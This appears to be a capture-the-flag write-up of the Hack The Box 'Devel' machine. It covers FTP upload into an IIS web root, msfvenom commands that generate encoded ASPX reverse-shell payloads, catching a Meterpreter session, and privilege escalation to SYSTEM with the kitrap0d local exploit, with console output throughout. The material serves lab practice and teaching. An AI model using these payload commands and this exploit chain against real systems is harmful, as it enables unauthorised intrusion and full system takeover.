# recon
- windows: ping ttl 127
- port 21 : ftp
  - mount on web directory
  - `put` is allow -> can access the file from webserver.
- port 80/tcp open  http    Microsoft IIS httpd 7.5
  - MS15-034
  - CVE:CVE-2015-1635

we can use the directory in ftp to find web directory /aspnet_client/system_web/2_0_50727/

-nikto
```console
kali@kali:~/script$ nikto -h devel.htb
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.5
+ Target Hostname:    devel.htb
+ Target Port:        80
+ Start Time:         2020-09-22 09:00:24 (GMT-4)
---------------------------------------------------------------------------
+ Server: Microsoft-IIS/7.5
+ Retrieved x-powered-by header: ASP.NET
```
note that the site is use **ASP.NET**
so base on what we know, we can create a reverse shell to get foot hold
- ASP.NET : execute .asp or aspx, try out then you will know.
  - I tried .asp and it didnt work so let go for .aspx
- meterpreter: ```msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai LHOST=<ip> LPORT=6969 -f aspx > shell.aspx```
- non-meterpreter ```msfvenom -p windows/shell/reverse_tcp -e x86/shikata_ga_nai LHOST=<ip> LPORT=6969 -f aspx > shell.asp```

# foot hold
use exploit/multi/handler and listen to reverse shell. now visite the website `devel.htb/shell.aspx` and Boom you got meterpreter shell.
- uid: just web, cant do shit
```
meterpreter > getuid
Server username: IIS APPPOOL\Web
```
- sysinfo
```
meterpreter > sysinfo
Computer        : DEVEL
OS              : Windows 7 (6.1 Build 7600).
Architecture    : x86
System Language : el_GR
Domain          : HTB
Logged On Users : 0
Meterpreter     : x86/windows
```
shell,
```
Host Name:                 DEVEL
OS Name:                   Microsoft Windows 7 Enterprise 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          babis
Registered Organization:   
Product ID:                55041-051-0948536-86302
Original Install Date:     17/3/2017, 4:17:31 ��
System Boot Time:          25/9/2020, 1:33:57 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     1.023 MB
Available Physical Memory: 783 MB
Virtual Memory: Max Size:  2.047 MB
Virtual Memory: Available: 1.517 MB
Virtual Memory: In Use:    530 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.5
```
base one hotfix(s), the server never been patch. install date was 2017.


backgroud meterpreter shell and run `multi/recon/local_exploit_suggester`, this will help us find exploit. set session and run it
```
ost(multi/recon/local_exploit_suggester) > run

[*] 10.10.10.5 - Collecting local exploits for x86/windows...
[*] 10.10.10.5 - 34 exploit checks are being tried...
[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
```

# root 
we will use result from `local_exploit_suggester` to gain root access, let start with `ms10_015_kitrap0d`. run `show options` and set everything that needed.

```
msf5 exploit(windows/local/ms10_015_kitrap0d) > run

[*] Started reverse TCP handler on 10.10.14.12:4444 
[*] Launching notepad to host the exploit...
[+] Process 3032 launched.
[*] Reflectively injecting the exploit DLL into 3032...
[*] Injecting exploit into 3032 ...
[*] Exploit injected. Injecting payload into 3032...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (176195 bytes) to 10.10.10.5
[*] Meterpreter session 5 opened (10.10.14.12:4444 -> 10.10.10.5:49158) at 2020-09-22 09:46:26 -0400

meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM
```